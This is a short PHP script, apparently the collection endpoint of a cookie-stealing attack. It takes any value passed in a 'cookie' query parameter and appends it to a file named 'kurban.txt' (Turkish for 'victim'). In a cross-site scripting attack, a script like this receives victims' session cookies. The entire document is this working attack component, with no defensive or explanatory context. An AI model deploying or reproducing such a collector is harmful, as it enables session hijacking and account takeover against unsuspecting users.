<?php
if(isset($_GET["cookie"])){
	$file = fopen('kurban.txt', 'a');
	fwrite($file, $_GET["cookie"]."\n");
	fclose($file);
}
